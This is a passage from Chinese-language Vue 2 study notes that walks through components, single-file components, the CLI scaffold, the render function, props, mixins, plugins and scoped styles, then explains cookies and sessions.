    //定义app组件
    const app = Vue.extend(&#123;
        template:`
                &lt;div&gt;    
                    &lt;hello&gt;&lt;/hello&gt;
                    &lt;school&gt;&lt;/school&gt;
                &lt;/div&gt;
            `,
        components:&#123;
            school,
            hello
        &#125;
    &#125;)

    //创建vm
    new Vue(&#123;
        template:&#39;&lt;app&gt;&lt;/app&gt;&#39;,
        el:&#39;#root&#39;,
        //注册组件（局部）
        components:&#123;app&#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<ul>
<li>標準化開發層級關係如下圖</li>
</ul>
 <img src="image-20230408085507192.png" alt="image-20230408085507192" style="zoom:80%;border: 5px solid orange;" />





<h3 id="1-20-4-VueComponent"><a href="#1-20-4-VueComponent" class="headerlink" title="1.20.4 VueComponent"></a>1.20.4 VueComponent</h3><ul>
<li>school组件本质是一个名为VueComponent的構造函數，且不是程序员定义的，是Vue.extend生成的。</li>
<li>我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。</li>
<li>特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！</li>
<li>关于this指向：<ul>
<li>组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。</li>
<li>new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。</li>
</ul>
</li>
<li>VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。</li>
<li>Vue的实例对象，以后简称vm。</li>
</ul>
<ul>
<li>Vue 在哪管理 VueComponent</li>
</ul>
<img src="image-20230406174839783.png" style="zoom: 80%;border: 5px solid orange;" />





<h3 id="1-20-5-一个重要的内置关系"><a href="#1-20-5-一个重要的内置关系" class="headerlink" title="1.20.5 一个重要的内置关系"></a>1.20.5 一个重要的内置关系</h3><ul>
<li>一个重要的内置关系：VueComponent.prototype.<strong>proto</strong> === Vue.prototype</li>
</ul>
<blockquote>
<p>:bulb:<em><strong><font color=red>此處的VueComponent的原型對象的原型對象原本應該為Object的原型對象，Vue將其強制改為Vue的原型對象</font></strong></em></p>
</blockquote>
<ul>
<li>为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。</li>
</ul>
<blockquote>
<p>:bulb:實例對象的隱式原型屬性，永遠指向自己締造者的原型對象 –&gt; 記憶：有點像java的繼承</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406174844341.png"></p>
<h2 id="1-21-单文件组件"><a href="#1-21-单文件组件" class="headerlink" title="1.21 单文件组件"></a>1.21 单文件组件</h2><p>单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，可使用下面方法.vue文件解析</p>
<ul>
<li>webpack：会将 .vue 文件解析成 html,css,js这些形式。</li>
<li>vue提供的腳手架【推薦】</li>
</ul>
<p>来做个单文件组件的案例：</p>
<blockquote>
<p>下面的單文件組件要放到腳手架中才能使用</p>
</blockquote>
<p><strong>School.vue</strong></p>
<pre><code class="html">&lt;!-- 組件的結構 --&gt;
&lt;template&gt;
    &lt;div class=&quot;demo&quot;&gt;
        &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
        &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;
        &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;    
    &lt;/div&gt;
&lt;/template&gt;

&lt;!-- 組件的交互相關的代碼(數據、方法....等等) --&gt;
&lt;script&gt;
     export default &#123;
        name:&#39;School&#39;,
        data()&#123;
            return &#123;
                name:&#39;尚硅谷&#39;,
                address:&#39;北京昌平&#39;
            &#125;
        &#125;,
        methods: &#123;
            showName()&#123;
                alert(this.name)
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;

&lt;!-- 組件的樣式 --&gt;
&lt;style&gt;
    .demo&#123;
        background-color: orange;
    &#125;
&lt;/style&gt;
</code></pre>
<p><strong>Student.vue</strong></p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;h2&gt;学生姓名：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
        &lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
     export default &#123;
        name:&#39;Student&#39;,
        data()&#123;
            return &#123;
                name:&#39;张三&#39;,
                age:18
            &#125;
        &#125;
    &#125;
&lt;/script&gt;
</code></pre>
<p><strong>App.vue</strong></p>
<p>用来彙總所有的组件(大总管)</p>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;School&gt;&lt;/School&gt;
        &lt;Student&gt;&lt;/Student&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    //引入组件
    import School from &#39;./School.vue&#39;
    import Student from &#39;./Student.vue&#39;

    export default &#123;
        name:&#39;App&#39;,
        components:&#123;
            School,
            Student
        &#125;
    &#125;
&lt;/script&gt;
</code></pre>
<p><strong>main.js</strong></p>
<p>在这个文件里面创建 vue 实例</p>
<pre><code class="js">import App from &#39;./App.vue&#39;

new Vue(&#123;
    el:&#39;#root&#39;,
    template:`&lt;App&gt;&lt;/App&gt;`,
    components:&#123;App&#125;,
&#125;)
</code></pre>
<p><strong>index.html</strong></p>
<p>在这写 vue 要绑定的容器</p>
<pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset=&quot;UTF-8&quot; /&gt;
        &lt;title&gt;练习一下单文件组件的语法&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;!-- 准备一个容器 --&gt;
        &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;
        &lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;
        &lt;script type=&quot;text/javascript&quot; src=&quot;./main.js&quot;&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h1 id="2-vue脚手架，自定义事件，插槽等复杂内容"><a href="#2-vue脚手架，自定义事件，插槽等复杂内容" class="headerlink" title="2. vue脚手架，自定义事件，插槽等复杂内容"></a>2. vue脚手架，自定义事件，插槽等复杂内容</h1><h2 id="2-1-分析脚手架"><a href="#2-1-分析脚手架" class="headerlink" title="2.1 分析脚手架"></a>2.1 分析脚手架</h2><h3 id="2-1-1-說明"><a href="#2-1-1-說明" class="headerlink" title="2.1.1 說明"></a>2.1.1 說明</h3><ul>
<li>Vue腳手架是Vue官方提供的標準化開發工具(開發平台)</li>
<li>最新的版本是4.x</li>
<li>文檔：<a target="_blank" rel="noopener" href="https://cli.vuejs.org/zh/">https://cli.vuejs.org/zh/</a></li>
<li>cli：command line interface</li>
</ul>
<h3 id="2-1-2-初始化脚手架"><a href="#2-1-2-初始化脚手架" class="headerlink" title="2.1.2 初始化脚手架"></a>2.1.2 初始化脚手架</h3><ul>
<li>第一步(没有安装过的执行)：全局安装 @vue/cli</li>
</ul>
<pre><code class="cmd">npm install -g @vue/cli
</code></pre>
<ul>
<li>第二步：***<font color=red>切换到要创建项目的目录</font>***，然后使用命令创建项目</li>
</ul>
<pre><code class="cmd">vue create xxxxx
</code></pre>
<ul>
<li>第三步：启动项目</li>
</ul>
<pre><code class="cmd">npm run serve
</code></pre>
<h3 id="2-1-3-脚手架文件结构"><a href="#2-1-3-脚手架文件结构" class="headerlink" title="2.1.3 脚手架文件结构"></a>2.1.3 脚手架文件结构</h3><pre><code>├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
</code></pre>
<h3 id="2-1-4-脚手架demo"><a href="#2-1-4-脚手架demo" class="headerlink" title="2.1.4 脚手架demo"></a>2.1.4 脚手架demo</h3><p>components:</p>
<p>就直接把单文件组件的 School.vue 和 Student.vue 两个文件直接拿来用，不需要修改。</p>
<p>App.vue:</p>
<p>引入这两个组件，注册一下这两个组件，再使用。</p>
<pre><code class="html">&lt;template&gt;
  &lt;div id=&quot;app&quot;&gt;
    &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;
    &lt;Student&gt;&lt;/Student&gt;
    &lt;School&gt;&lt;/School&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import School from &#39;./components/School.vue&#39;
import Student from &#39;./components/Student.vue&#39;

export default &#123;
  name: &#39;App&#39;,
  components: &#123;
    School,
    Student
  &#125;
&#125;
&lt;/script&gt;

&lt;style&gt;
#app &#123;
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
&#125;
&lt;/style&gt;
</code></pre>
<p>main.js:</p>
<p>入口文件</p>
<pre><code class="js">import Vue from &#39;vue&#39;
import App from &#39;./App.vue&#39;

Vue.config.productionTip = false

new Vue(&#123;
  render: h =&gt; h(App),
&#125;).$mount(&#39;#app&#39;) //.mount(&#39;#app&#39;)等於 el:&#39;#app&#39;
</code></pre>
<p>接下来就要详细讲解 main.js 中的 render 函数</p>
<h3 id="2-1-5-render函数"><a href="#2-1-5-render函数" class="headerlink" title="2.1.5 render函数"></a>2.1.5 render函数</h3><blockquote>
<p>插入一个小知识：</p>
</blockquote>
<p>使用 import 导入第三方库的时候不需要 加 ‘./‘</p>
<p>导入我们自己写的：</p>
<pre><code class="js">import App from &#39;./App.vue&#39;
</code></pre>
<p>导入第三方的</p>
<pre><code class="js">import Vue from &#39;vue&#39;
</code></pre>
<p>不需要在 from ‘vue’ 加 <code>&#39;./&#39;</code> 的原因是第三方库 node_modules 人家帮我们配置好了。</p>
<p>我们通过 import 导入第三方库，在第三方库的 package.json 文件中确定了我们引入的是哪个文件</p>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406192336061.png"></p>
<p>通过 module 确定了我们要引入的文件。</p>
<blockquote>
<p>回到 render 函数</p>
</blockquote>
<p>之前的写法是这样：</p>
<pre><code class="js">import App from &#39;./App.vue&#39;

new Vue(&#123;
    el:&#39;#root&#39;,
    template:`&lt;App&gt;&lt;/App&gt;`,
    components:&#123;App&#125;,
&#125;)
</code></pre>
<p>如果这样子写，运行的话会引发如下的报错</p>
<img src="image-20230406192346078.png" style="zoom:80%;border: 5px solid orange;" />

<p>报错的意思是，是在使用运行版本的 vue ，没有模板解析器。</p>
<p>从上面的小知识可以知道，我们引入的 vue 不是完整版的，是残缺的（为了减小vue的大小）。所以残缺的vue.js 只有通过 render 函数才能把项目给跑起来。</p>
<p>来解析一下render</p>
<pre><code class="js">// render最原始写的方式
// render是个函数，还能接收到参数a
// 这个 createElement 很关键，是个回调函数
new Vue(&#123;
  render(createElement) &#123;
      console.log(typeof createElement);
      // 这个 createElement 回调函数能创建元素
      // 因为残缺的vue 不能解析 template，所以render就来帮忙解决这个问题
      // createElement 能创建具体的元素
      return createElement(&#39;h1&#39;, &#39;hello&#39;)
  &#125;
&#125;).$mount(&#39;#app&#39;)
</code></pre>
<img src="image-20230406192356666.png" style="zoom:80%;border: 5px solid orange;" />

<p>因为 render 函数内并没有用到 this，所以可以简写成箭头函数。</p>
<pre><code class="js">new Vue(&#123;
  // render: h =&gt; h(App),
  render: (createElement) =&gt; &#123;
    return createElement(App)
  &#125;
&#125;).$mount(&#39;#app&#39;)
</code></pre>
<p>再简写：</p>
<pre><code class="js">new Vue(&#123;
  // render: h =&gt; h(App),
  render: createElement =&gt; createElement(App)
&#125;).$mount(&#39;#app&#39;)
</code></pre>
<p>最后把 createElement 换成 h 就完事了。</p>
<p>算啦算啦，把简写都整理一遍吧，js里的简写确实多哇。</p>
<p>对象内写方法最原始的：</p>
<pre><code class="js">let obj = &#123;
    name: &#39;aaa&#39;,
    work: function (salary) &#123;
        return &#39;工资&#39; + salary;
    &#125;
&#125;
</code></pre>
<p>ES6 简化版：</p>
<pre><code class="js">let obj = &#123;
    name: &#39;aaa&#39;,
    work(salary) &#123;
        return &#39;工资&#39; + salary;
    &#125;
&#125;
</code></pre>
<p>箭头函数简化版:</p>
<pre><code class="js">let obj = &#123;
    name: &#39;aaa&#39;,
    work: (salary) =&gt; &#123;
        return &#39;工资&#39; + salary;
    &#125;
&#125;
</code></pre>
<p>箭头函数再简化（最终版）：</p>
<pre><code class="js">// 只有一个参数就可以把圆括号去了，函数体内部只有一个 return 就可以把大括号去掉，return去掉
let obj = &#123;
    name: &#39;aaa&#39;,
    work: salary =&gt; &#39;工资&#39; + salary;
&#125;
</code></pre>
<p>这样就可以理解 render 函数的简写方式了。</p>
<p>来个不同版本 vue 的区别</p>
<ul>
<li>vue.js与vue.runtime.xxx.js的区别：<ul>
<li>vue.js是完整版的Vue，包含：核心功能+模板解析器。</li>
<li>vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。</li>
</ul>
</li>
<li>因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。</li>
</ul>
<h3 id="2-1-6-修改脚手架的默认配置"><a href="#2-1-6-修改脚手架的默认配置" class="headerlink" title="2.1.6 修改脚手架的默认配置"></a>2.1.6 修改脚手架的默认配置</h3><ul>
<li>使用vue inspect &gt; output.js可以查看到Vue脚手架的默认配置。</li>
<li>使用vue.config.js可以对脚手架进行个性化定制，详情见：<a target="_blank" rel="noopener" href="https://cli.vuejs.org/zh">https://cli.vuejs.org/zh</a></li>
</ul>
<h3 id="2-1-7-脚手架中的index-html"><a href="#2-1-7-脚手架中的index-html" class="headerlink" title="2.1.7 脚手架中的index.html"></a>2.1.7 脚手架中的index.html</h3><pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;&quot;&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 --&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
    &lt;!-- 开启移动端的理想视口 --&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;
    &lt;!-- 配置页签图标 --&gt;
    &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt;
    &lt;!-- 引入第三方样式 --&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;&lt;%= BASE_URL %&gt;css/bootstrap.css&quot;&gt;
    &lt;!-- 配置网页标题 --&gt;
    &lt;title&gt;硅谷系统&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
        &lt;!-- 当浏览器不支持js时noscript中的元素就会被渲染 --&gt;
    &lt;noscript&gt;
      &lt;strong&gt;We&#39;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt;
    &lt;/noscript&gt;
        &lt;!-- 容器 --&gt;
    &lt;div id=&quot;app&quot;&gt;&lt;/div&gt;
    &lt;!-- built files will be auto injected --&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="2-2-vue-零碎的一些知识"><a href="#2-2-vue-零碎的一些知识" class="headerlink" title="2.2 vue 零碎的一些知识"></a>2.2 vue 零碎的一些知识</h2><h3 id="2-2-1-ref属性"><a href="#2-2-1-ref属性" class="headerlink" title="2.2.1 ref属性"></a>2.2.1 ref属性</h3><ul>
<li>被用来给元素或子组件注册引用信息（id的替代者）</li>
<li>应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）</li>
<li>使用方式：<ul>
<li>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code>或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li>
<li>获取：<code>this.$refs.xxx</code></li>
</ul>
</li>
</ul>
<blockquote>
<p>具体案例</p>
</blockquote>
<pre><code class="html">&lt;template&gt;
    &lt;div&gt;
        &lt;h1 v-text=&quot;msg&quot; ref=&quot;title&quot;&gt;&lt;/h1&gt;
        &lt;button ref=&quot;btn&quot; @click=&quot;showDOM&quot;&gt;点我输出上方的DOM元素&lt;/button&gt;
        &lt;School ref=&quot;sch&quot;/&gt;
    &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
    //引入School组件
    import School from &#39;./components/School&#39;

    export default &#123;
        name:&#39;App&#39;,
        components:&#123;School&#125;,
        data() &#123;
            return &#123;
                msg:&#39;欢迎学习Vue！&#39;
            &#125;
        &#125;,
        methods: &#123;
            showDOM()&#123;
                console.log(this.$refs.title) //真实DOM元素
                console.log(this.$refs.btn) //真实DOM元素
                console.log(this.$refs.sch) //School组件的实例对象（vc）
            &#125;
        &#125;,
    &#125;
&lt;/script&gt;
</code></pre>
<h3 id="2-2-2-props配置项"><a href="#2-2-2-props配置项" class="headerlink" title="2.2.2 props配置项"></a>2.2.2 props配置项</h3><ol>
<li><p>功能：让组件接收外部传过来的数据</p>
</li>
<li><p>传递数据：</p>
<p><code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p>
</li>
<li><p>接收数据：</p>
<ul>
<li>第一种方式（只接收）：<code>props:[&#39;name&#39;]</code></li>
<li>第二种方式（限制类型）：<code>props:&#123;name:String&#125;</code></li>
<li>第三种方式（限制类型、限制必要性、指定默认值）：</li>
</ul>
<pre><code class="js">props:&#123;
    name:&#123;
        type:String, //类型
        required:true, //必要性
        default:&#39;老王&#39; //默认值 (寫了required:true就沒必要寫default)
    &#125;
&#125;
</code></pre>
</li>
</ol>
<ol start="4">
<li>備註：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。</li>
</ol>
<blockquote>
<p>示例代码：</p>
<p>父组件给子组件传数据</p>
</blockquote>
<p>App.vue</p>
<pre><code class="html">&lt;template&gt;
  &lt;div id=&quot;app&quot;&gt;
    &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;
    &lt;Student&gt;&lt;/Student&gt;
    &lt;School name=&quot;haha&quot; :age=&quot;this.age&quot;&gt;&lt;/School&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
import School from &#39;./components/School.vue&#39;
import Student from &#39;./components/Student.vue&#39;

export default &#123;
  name: &#39;App&#39;,
  data () &#123;
    return &#123;
      age: 360  
    &#125;
  &#125;,
  components: &#123;
    School,
    Student
  &#125;
&#125;
&lt;/script&gt;

&lt;style&gt;
#app &#123;
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
&#125;
&lt;/style&gt;
</code></pre>
<p>School.vue</p>
<pre><code class="html">&lt;template&gt;
  &lt;div class=&quot;demo&quot;&gt;
    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;学校年龄：&#123;&#123; age &#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;/h2&gt;
    &lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default &#123;
  name: &quot;School&quot;,
  // 最简单的写法：props: [&#39;name&#39;, &#39;age&#39;]
  props: &#123;
    name: &#123;
      type: String,
      required: true // 必须要传的
    &#125;,
    age: &#123;
      type: Number,
      required: true
    &#125;
  &#125;,
  data() &#123;
    return &#123;
      address: &quot;北京昌平&quot;,
    &#125;;
  &#125;,
  methods: &#123;
    showName() &#123;
      alert(this.name);
    &#125;,
  &#125;,
&#125;;
&lt;/script&gt;

&lt;style&gt;
.demo &#123;
  background-color: orange;
&#125;
&lt;/style&gt;
</code></pre>
<h3 id="2-2-3-mixin-混入-配置項"><a href="#2-2-3-mixin-混入-配置項" class="headerlink" title="2.2.3 mixin(混入)配置項"></a>2.2.3 mixin(混入)配置項</h3><p>混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。</p>
<ul>
<li><p>功能：可以把多個組件共用的配置提取成一個混入對象</p>
</li>
<li><p>使用方式：</p>
<ul>
<li>第一步定義混合，例如</li>
</ul>
<pre><code class="js">&#123;
    data()&#123;.....&#125;,
    methods:&#123;.....&#125;
    .....
&#125;
</code></pre>
<ul>
<li>第二步使用混入，例如<ul>
<li>全局混入：Vue.mixin(xxx)</li>
<li>局部混入：mixins:[‘xxx’]</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>例子：</p>
<pre><code class="js">// 定义一个混入对象
var myMixin = &#123;
  created: function () &#123;
    this.hello()
  &#125;,
  methods: &#123;
    hello: function () &#123;
      console.log(&#39;hello from mixin!&#39;)
    &#125;
  &#125;
&#125;

// 定义一个使用混入对象的组件
var Component = Vue.extend(&#123;
  mixins: [myMixin]
&#125;)
</code></pre>
<p><strong>选项合并</strong></p>
<p>当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。</p>
<p>比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。</p>
<pre><code class="js">var mixin = &#123;
  data: function () &#123;
    return &#123;
      message: &#39;hello&#39;,
      foo: &#39;abc&#39;
    &#125;
  &#125;
&#125;

new Vue(&#123;
  mixins: [mixin],
  data: function () &#123;
    return &#123;
      message: &#39;goodbye&#39;,
      bar: &#39;def&#39;
    &#125;
  &#125;,
  created: function () &#123;
    console.log(this.$data)
    // =&gt; &#123; message: &quot;goodbye&quot;, foo: &quot;abc&quot;, bar: &quot;def&quot; &#125;
  &#125;
&#125;)
</code></pre>
<p>同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子<strong>之前</strong>调用。</p>
<pre><code class="js">var mixin = &#123;
  created: function () &#123;
    console.log(&#39;混入对象的钩子被调用&#39;)
  &#125;
&#125;

new Vue(&#123;
  mixins: [mixin],
  created: function () &#123;
    console.log(&#39;组件钩子被调用&#39;)
  &#125;
&#125;)

// =&gt; &quot;混入对象的钩子被调用&quot;
// =&gt; &quot;组件钩子被调用&quot;
</code></pre>
<p>值为对象的选项，例如 <code>methods</code>、<code>components</code> 和 <code>directives</code>，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。</p>
<pre><code class="js">var mixin = &#123;
  methods: &#123;
    foo: function () &#123;
      console.log(&#39;foo&#39;)
    &#125;,
    conflicting: function () &#123;
      console.log(&#39;from mixin&#39;)
    &#125;
  &#125;
&#125;

var vm = new Vue(&#123;
  mixins: [mixin],
  methods: &#123;
    bar: function () &#123;
      console.log(&#39;bar&#39;)
    &#125;,
    conflicting: function () &#123;
      console.log(&#39;from self&#39;)
    &#125;
  &#125;
&#125;)

vm.foo() // =&gt; &quot;foo&quot;
vm.bar() // =&gt; &quot;bar&quot;
vm.conflicting() // =&gt; &quot;from self&quot;
</code></pre>
<blockquote>
<p>全局混入不建议使用</p>
</blockquote>
<h3 id="2-2-4-插件"><a href="#2-2-4-插件" class="headerlink" title="2.2.4 插件"></a>2.2.4 插件</h3><ul>
<li><p>功能：用於增強Vue</p>
</li>
<li><p>本質：包含install方法的一個對象，install的第一個參數是Vue，第二個以後的參數是插件使用者傳遞的數據。</p>
</li>
<li><p>定義插件：</p>
<pre><code class="js">對象.install = function (Vue, options)&#123;
    //1. 添加全局過濾器
    Vue.filter(....)
    //2. 添加全局指令
    Vue.directive(....)
    //3. 配置全局混入
    Vue.mixin(....)
    //4. 添加實例方法
    Vue.prototype.$myMethod = function()&#123;...&#125;
    Vue.prototype.$myProperty = xxxx
&#125;
</code></pre>
</li>
<li><p>使用插件：Vue.use()</p>
</li>
</ul>
<p>具体案例：</p>
<p>plugin.js</p>
<pre><code class="js">export default &#123;
    install(Vue, x, y, z) &#123;
        console.log(x, y, z)
        //全局过滤器
        Vue.filter(&#39;mySlice&#39;, function (value) &#123;
            return value.slice(0, 4)
        &#125;)

        //定义全局指令
        Vue.directive(&#39;fbind&#39;, &#123;
            //指令与元素成功绑定时（一上来）
            bind(element, binding) &#123;
                element.value = binding.value
            &#125;,
            //指令所在元素被插入页面时
            inserted(element, binding) &#123;
                element.focus()
            &#125;,
            //指令所在的模板被重新解析时
            update(element, binding) &#123;
                element.value = binding.value
            &#125;
        &#125;)

        //定义混入
        Vue.mixin(&#123;
            data() &#123;
                return &#123;
                    x: 100,
                    y: 200
                &#125;
            &#125;,
        &#125;)

        //给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () =&gt; &#123; alert(&#39;你好啊aaaa&#39;) &#125;
    &#125;
&#125;
</code></pre>
<p>main.js</p>
<p>通过全局方法 <code>Vue.use()</code> 使用插件。它需要在你调用 <code>new Vue()</code> 启动应用之前完成：</p>
<pre><code class="js">// 引入插件
import plugin from &#39;./plugin&#39;

// 调用 `MyPlugin.install(Vue)`
Vue.use(plugin)

new Vue(&#123;
  // ...组件选项
&#125;)
</code></pre>
<p>然后就可以在别的组件使用插件里的功能了。</p>
<h3 id="2-2-5-scoped样式"><a href="#2-2-5-scoped样式" class="headerlink" title="2.2.5 scoped样式"></a>2.2.5 scoped样式</h3><ol>
<li>作用：让样式在局部生效，防止冲突。</li>
<li>写法：<code>&lt;style scoped&gt;</code></li>
</ol>
<p>具体案例：</p>
<pre><code class="vue">&lt;style lang=&quot;less&quot; scoped&gt; &lt;!-- lang：style的語言css/less；scoped：只作用在當前vue組件 --&gt;
    .demo&#123;
        background-color: pink;
        .atguigu&#123;
            font-size: 40px;
        &#125;
    &#125;
&lt;/style&gt;
</code></pre>
<h3 id="2-2-6-总结TodoList案例"><a href="#2-2-6-总结TodoList案例" class="headerlink" title="2.2.6 总结TodoList案例"></a>2.2.6 总结TodoList案例</h3><ul>
<li><p>组件化编码流程：</p>
<ul>
<li>拆分静态组件：组件要<em><strong>按照功能点拆分</strong></em>，命名不要与html元素冲突。</li>
<li>实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：<ul>
<li>一个组件在用：放在组件自身即可。</li>
<li>一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</li>
</ul>
</li>
<li>实现交互：从绑定事件开始。</li>
</ul>
</li>
<li><p>props适用于：</p>
<ul>
<li>父组件 ==&gt; 子组件 通信</li>
<li>子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</li>
</ul>
</li>
<li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p>
</li>
</ul>
<blockquote>
<p>若v-model綁定的是props傳過來的對象類型的值，修改對象中的屬性時Vue監測不到(不會報錯)，但不推薦，因為有點違反原則</p>
</blockquote>
<h2 id="2-3-浏览器本地存储"><a href="#2-3-浏览器本地存储" class="headerlink" title="2.3 浏览器本地存储"></a>2.3 浏览器本地存储</h2><h3 id="2-3-1-Cookie"><a href="#2-3-1-Cookie" class="headerlink" title="2.3.1 Cookie"></a>2.3.1 Cookie</h3><p>Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie 是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用 于控制 Cookie 有效期、安全性、使用范围的可选属性组成。不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie 一同发送到服务器。</p>
<p><strong>Cookie的特性：</strong></p>
<ul>
<li>Cookie一旦创建成功，名称就无法修改</li>
<li>Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie</li>
<li>每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb</li>
<li>有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的</li>
<li>Cookie在请求一个新的页面的时候都会被发送过去</li>
</ul>
<p><strong>Cookie 在身份认证中的作用</strong></p>
<p>客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动 将 Cookie 保存在浏览器中。</p>
<p>随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie，通过请求头的形式发送给 服务器，服务器即可验明客户端的身份。</p>
<img src="image-20230406192435392.png" alt="image-20230406192435392" style="zoom:80%;border: 5px solid orange;" />

<p><strong>Cookie 不具有安全性</strong></p>
<p>由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全 性。因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。</p>
<blockquote>
<p>注意：千万不要使用 Cookie 存储重要且隐私的数据！比如用户的身份信息、密码等。</p>
</blockquote>
<h3 id="2-3-2-Session"><a href="#2-3-2-Session" class="headerlink" title="2.3.2 Session"></a>2.3.2 Session</h3><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了session是一种特殊的cookie。cookie是保存在客户端的，而session是保存在服务端。</p>
